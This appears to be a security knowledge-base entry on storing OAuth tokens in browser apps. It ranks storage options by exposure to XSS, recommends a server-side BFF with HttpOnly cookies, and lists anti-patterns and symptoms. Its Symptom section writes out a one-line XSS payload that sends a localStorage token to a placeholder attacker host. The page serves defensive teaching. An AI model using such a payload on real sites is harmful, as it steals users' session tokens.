---
title: Token Storage in the Browser
type: entity
domain: keycloak
slug: token-storage-browser
summary: "No safe purely-browser token store exists: localStorage/sessionStorage are readable by any JS (including XSS payloads), in-memory tokens vanish on reload, and Web Workers do not sandbox token data from injected scripts. The only architecture that removes tokens from the browser entirely is the BFF / Token Handler pattern using HttpOnly encrypted cookies."
sources:
  - web:https://www.ietf.org/archive/id/draft-ietf-oauth-browser-based-apps-26.html (OAuth BBA draft-26, fetched 2026-06-17)
  - web:https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html (OWASP Cheat Sheet Series, fetched 2026-06-18)
  - web:https://owasp.org/www-project-application-security-verification-standard/ (OWASP ASVS 4.0.3, fetched 2026-06-18)
  - web:https://curity.io/resources/learn/the-bff-pattern/ (Curity BFF / Token Handler, fetched 2026-06-17)
provenance_extracted: 18
provenance_inferred: 4
provenance_ambiguous: 1
tags: [clients, tokens, security, anti-pattern]
symptoms:
  - "431 Request Header Fields Too Large"
  - "third-party cookie blocked"
  - "JWT in localStorage"
  - "Set-Cookie missing HttpOnly"
status: reviewed
updated: 2026-07-25
graph_community: "Tokens & Sessions"
---

# Token Storage in the Browser

**The question of where a browser application stores OAuth tokens determines its entire XSS blast radius — every option short of a server-side BFF leaks the token to injected JavaScript.**

## Rule

Tokens must never sit in any JS-readable storage location. The hierarchy from most to least exposed, per BBA draft-26 §8:

| Store | JS-readable | Notes |
|---|---|---|
| `localStorage` | Yes — persists across tabs/restarts | Exfiltratable by any XSS (§8.5) |
| `sessionStorage` | Yes — tab-scoped, cleared on close | Still readable by JS during session (§8.4) |
| Web Workers | Yes — main thread can still reach | Not an isolation boundary (§8.3) |
| Service Workers | Yes (indirectly) | Malicious code with origin access can extract (§8.2) |
| In-memory (JS variable) | Yes — lost on reload | Some reduction in persistence, no XSS protection (§8.4) |
| HttpOnly cookie | **No** — browser withholds from JS | Only truly JS-opaque store; requires a server to set |

The one architecture that avoids exposing tokens to the browser at all is the BFF / Token Handler: a server-side OAuth Agent runs the Authorization Code flow as a confidential client, encrypts all tokens (access, refresh, ID) into HttpOnly cookies, and the SPA never receives a raw token (BBA draft-26 §6.1; Curity BFF §"Recommended Solution"). For sensitive or personal-data applications, the BFF is the strongly recommended pattern (BBA draft-26 §6.1.4.3.3).

ASVS V3.2.3 allows `sessionStorage` as a "secured" location (tab-scoped, cleared on close), but OWASP Session Management guidance advises against all Web Storage for session tokens. The OWASP JWT for Java sheet further permits `sessionStorage` + `Authorization: Bearer` hardened with a strict CSP as a fallback when a BFF is not available — treat this as a minimum bar, not a default (see Contradictions).

A token-mediating backend is a middle ground: it holds the refresh token server-side but hands the access token to the browser (BBA draft-26 §6.2.1). The access token remains stealable; use this only when a proxying BFF is infeasible (§6.2.4.4.3) (inferred from draft-26's tiered architecture framing).

Cookie attributes required for session cookies bearing an opaque session ID to a BFF (ASVS V3.4.1–V3.4.4; OWASP Session Mgmt; Curity Token Handler):

- `HttpOnly` — blocks `document.cookie` / JS read
- `Secure` — TLS-only transmission
- `SameSite=Strict` — blocks cross-site sends (Curity uses Strict; ASVS 3.4.3 accepts Lax)
- `__Host-` prefix — host-bound; forces Secure, Path=/, no Domain attribute
- Encrypted content — if tokens travel inside the cookie body, the payload must be server-side encrypted; JS must never reach the plaintext (BBA draft-26 §6.1.3.2; Curity §"OAuth Agent Cookies")

Refresh tokens are the highest-value target. A browser-stored refresh token lets an attacker mint new access tokens long after the user leaves (Curity BFF §"The Security Issues of an SPA"). It must never be JS-accessible regardless of the chosen pattern.

The Token Handler / BFF must also be hosted on the same parent domain as the SPA so cookies are first-party. Third-party cookie restrictions in Safari and Chrome will silently drop cross-domain cookies (Curity §"Hosting Prerequisite") (inferred that browser ITP is the operative mechanism).

## Anti-pattern

1. **JWT or opaque token in `localStorage`** — the most common SPA shortcut. Survives tab close; any XSS on the origin can steal it.
2. **JWT in `sessionStorage` without CSP, short lifetime, or rotation** — tab-scoped but still JS-readable during the session; insufficient on its own.
3. **Web Worker as a token sandbox** — the main thread can still reach the Worker's state; injected scripts are not blocked by the Worker boundary (BBA draft-26 §8.3).
4. **Silent iframe re-auth against a cross-domain AS** — browser tracking-prevention drops the third-party cookie; silent renewal fails (Curity §"Browser Security").
5. **Token returned in a JSON body to the SPA** even when using a BFF-like server — the raw JWT appears in DevTools Network / Response.
6. **Token in the URL** (query or path parameter) — leaks into browser history, server logs, and `Referer` headers (OWASP Session Mgmt §"Used vs. Accepted Session ID Exchange Mechanisms").

## Symptom

The following are the concrete, observable failures a wrong implementation produces:

- **XSS exfiltration** — `fetch('//attacker/?t='+localStorage.getItem('token'))` or `document.cookie` read succeeds; token visible in DevTools Storage tab; pen-test finding "JWT in localStorage."
- **Token survives logout** — refresh token in `localStorage` is still valid after the user clicks "Log out" (no server-side revocation path); attacker replays it days later. Logs show access from an attacker IP after the session "ended."
- **Session persists after tab close** — `localStorage` token survives and replays on the next visit to the site (shared kiosk scenario).
- **Silent renew fails in Safari / Firefox** — `"third-party cookie blocked"` console warning; 401 on the next API call; user appears logged out unexpectedly. Root cause: SPA relied on a cross-domain iframe refresh.
- **SAST / pentest finding** — scanner flags `"sensitive data in web storage"`, `"JWT in localStorage"`, `"Set-Cookie missing HttpOnly"`, or `"Set-Cookie missing Secure"`.
- **`HTTP 431 Request Header Fields Too Large`** — oversized encrypted cookie (large claim payload + RS256) exceeds gateway header limits (Curity §"Cookie Limits").
- **Token visible in DevTools Network** — BFF returned a raw JWT in the response body instead of setting an HttpOnly cookie.

## Surface (client vs backend)

**Client (SPA / browser):**
- Must NOT read, store, or forward any raw token. It makes same-origin Ajax calls to the BFF/OAuth Agent endpoints (`/login/start`, `/login/end`, `/refresh`, `/logout`, `/session`) and receives opaque session cookies in return.
- Must send a custom static header (e.g. `token-handler-version: 1`) on every API call so that cross-origin simple requests trigger a CORS preflight the browser then blocks — this is the third CSRF layer (Curity §"Cross Site Request Forgery Protections").
- If a BFF is not available (public SPA pattern), the minimum-bar fallback per OWASP JWT sheet is `sessionStorage` + `Authorization: Bearer` + strict CSP + short token lifetime (15–30 min idle / ~8 h absolute) + rotation. This is explicitly not the preferred approach (inferred synthesis across OWASP sheets and BBA draft-26).

**Backend (BFF / OAuth Agent / confidential client):**
- Runs the Authorization Code + PKCE flow as a confidential client (client secret or mTLS stays server-side).
- Sets all session/token cookies with `HttpOnly`, `Secure`, `SameSite=Strict`, `__Host-` prefix.
- Encrypts token payloads before placing them in cookies; the encryption key never leaves the backend.
- Maintains an allowlist of approved upstream resource servers; must not act as an open proxy (BBA draft-26 §6.1.3.6).
- Enforces CSRF defense in three layers: `SameSite=Strict`, CORS origin enforcement / preflight, and required custom request header.
- Responds with `Cache-Control: no-store` on any response carrying a session identifier (OWASP Session Mgmt §"Web Content Caching").
- Token Handler / BFF does not eliminate the need for XSS defenses (CSP, input validation, output encoding, dependency vetting) — an XSS payload that cannot steal the raw token can still replay the session cookie against the API (Curity §"The Security Issues of an SPA") (inferred that BFF limits blast radius but does not eliminate XSS risk).

## Contradictions / caveats

**OWASP internal disagreement on sessionStorage:** The OWASP Session Management Cheat Sheet prohibits storing session tokens in any Web Storage (localStorage or sessionStorage — both JS-readable). The OWASP JWT for Java Cheat Sheet permits `sessionStorage` + `Authorization: Bearer` hardened with CSP as a pragmatic SPA fallback. ASVS V3.2.3 lists `sessionStorage` as an "appropriately secured" location alongside cookies. Resolution: prefer the BFF / HttpOnly cookie model. If a public SPA must hold the token, treat the JWT-sheet pattern as the minimum acceptable bar with explicit short lifetime, CSP, and rotation — never the default.

**Rotation does not stop persistent theft:** BBA draft-26 §5.1.2.3 is explicit that refresh token rotation does not prevent a determined attacker who can clear the app's copy of the newest token (browser offline / clear storage) and keep replaying the stolen one. Rotation limits the window of undetected use, not total exposure. See [[refresh-token-rotation]].

**OWASP cheat sheets are guidance, not a numbered standard.** Section references above are heading anchors. For numbered, auditable requirements use ASVS V3.4.* (cookie attributes) or ASVS V8.2.2 (data protection), or the IETF BBA draft.

## See also
- [[tokens-and-sessions]] — server-side session lifecycle behind browser token storage

- [[bff-token-handler]] — full BFF / Token Handler architecture; OAuth Agent cookie spec
- [[refresh-token-rotation]] — rotation limits but does not eliminate persistent theft
- [[cors-for-spa]] — CORS requirements for token endpoint and BFF APIs
- [[pkce]] — PKCE requirement for all browser-based / public clients
- [[state-and-nonce]] — CSRF and replay defenses at the protocol level
- [[dpop]] — sender-constrained tokens as an alternative to pure rotation
- [[mtls-bound-tokens]] — mTLS binding as the other sender-constraining mechanism
- [[rp-initiated-logout]] — ensuring logout actually invalidates the server-side session
- [[back-channel-logout]] — propagating logout when the browser is offline
- [[oidc-client-best-practices]] — RHBK-specific SPA / OIDC client guidance
- [[jwt-validation-pitfalls]] — what the resource server must verify once the token arrives
- [[token-revocation]] — server-side revocation to cover the logout gap
- [[native-app-oauth]] — different storage constraints for native (non-browser) apps
- [[sso-implementation-review]] — MOC: evaluating an SSO implementation for faults
- [[securing-apps-oidc-saml]]
